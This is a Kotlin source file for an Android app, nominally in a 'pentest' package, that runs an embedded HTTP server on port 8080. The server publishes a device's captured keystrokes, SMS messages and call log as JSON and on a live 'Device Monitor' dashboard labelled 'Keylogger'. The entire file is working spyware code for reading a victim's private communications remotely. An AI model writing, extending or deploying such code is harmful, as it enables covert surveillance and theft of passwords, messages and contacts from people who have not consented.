package com.yourorg.pentest.monitor

import android.content.Context
import fi.iki.elonen.NanoHTTPD
import org.json.JSONArray
import org.json.JSONObject

class LogServer(private val context: Context, port: Int = 8080) : NanoHTTPD(port) {

    override fun serve(session: IHTTPSession): Response {
        return when (session.uri) {
            "/" -> newFixedLengthResponse(Response.Status.OK, "text/html", getMainPage())
            "/keys" -> newFixedLengthResponse(Response.Status.OK, "application/json", getKeysJson())
            "/sms" -> newFixedLengthResponse(Response.Status.OK, "application/json", getSmsJson())
            "/calls" -> newFixedLengthResponse(Response.Status.OK, "application/json", getCallsJson())
            else -> newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not Found")
        }
    }

    private fun getMainPage(): String {
        val keys = getKeysJson()
        val sms = getSmsJson()
        val calls = getCallsJson()
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Device Monitor</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
                h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
                h2 { color: #0ff; margin: 20px 0 10px; }
                .section { background: #111; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
                .log-entry { padding: 4px 0; border-bottom: 1px solid #222; font-size: 13px; }
                .timestamp { color: #888; }
                .badge { display: inline-block; background: #00ff41; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 8px; }
                .refresh-btn { background: #00ff41; color: #000; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin: 10px 0; }
                .refresh-btn:hover { background: #00cc33; }
            </style>
        </head>
        <body>
            <h1>🔍 Device Monitor Live View</h1>
            <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
            <p style="margin:10px 0;color:#666;">Auto-refresh every 5 seconds</p>

            <div class="section">
                <h2>⌨️ Keylogger</h2>
                <div id="keys">
                    ${keys.let { 
                        val arr = JSONArray(it)
                        if (arr.length() == 0) "<p style='color:#666'>No keystrokes captured yet.</p>"
                        else {
                            val sb = StringBuilder()
                            for (i in 0 until arr.length()) {
                                val obj = arr.getJSONObject(i)
                                sb.append("<div class='log-entry'>")
                                sb.append("<span class='timestamp'>${obj.optString("timestamp", "")}</span> ")
                                sb.append("<span>${escapeHtml(obj.optString("key", ""))}</span>")
                                sb.append("<span class='badge'>${escapeHtml(obj.optString("packageName", ""))}</span>")
                                sb.append("</div>")
                            }
                            sb.toString()
                        }
                    }}
                </div>
            </div>

            <div class="section">
                <h2>💬 SMS Messages</h2>
                <div id="sms">
                    ${sms.let {
                        val arr = JSONArray(it)
                        if (arr.length() == 0) "<p style='color:#666'>No SMS captured yet.</p>"
                        else {
                            val sb = StringBuilder()
                            for (i in 0 until arr.length()) {
                                val obj = arr.getJSONObject(i)
                                sb.append("<div class='log-entry'>")
                                sb.append("<span class='timestamp'>${obj.optString("date", "")}</span> ")
                                sb.append("<b>${escapeHtml(obj.optString("address", ""))}</b>: ")
                                sb.append(escapeHtml(obj.optString("body", "")))
                                sb.append("</div>")
                            }
                            sb.toString()
                        }
                    }}
                </div>
            </div>

            <div class="section">
                <h2>📞 Call Log</h2>
                <div id="calls">
                    ${calls.let {
                        val arr = JSONArray(it)
                        if (arr.length() == 0) "<p style='color:#666'>No calls captured yet.</p>"
                        else {
                            val sb = StringBuilder()
                            for (i in 0 until arr.length()) {
                                val obj = arr.getJSONObject(i)
                                sb.append("<div class='log-entry'>")
                                sb.append("<span class='timestamp'>${obj.optString("date", "")}</span> ")
                                sb.append("<span>${escapeHtml(obj.optString("type", ""))}</span> ")
                                sb.append("<b>${escapeHtml(obj.optString("number", ""))}</b>")
                                sb.append("</div>")
                            }
                            sb.toString()
                        }
                    }}
                </div>
            </div>

            <script>
                setInterval(function() {
                    location.reload();
                }, 5000);
            </script>
        </body>
        </html>
        """.trimIndent()
    }

    private fun getKeysJson(): String {
        val keysJson = context.getSharedPreferences("keylog_prefs", Context.MODE_PRIVATE)
            .getString("key_log", "[]")
        return keysJson ?: "[]"
    }

    private fun getSmsJson(): String {
        val smsJson = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE)
            .getString("sms_log", "[]")
        return smsJson ?: "[]"
    }

    private fun getCallsJson(): String {
        val callsJson = context.getSharedPreferences("call_prefs", Context.MODE_PRIVATE)
            .getString("call_log", "[]")
        return callsJson ?: "[]"
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#39;")
    }
}
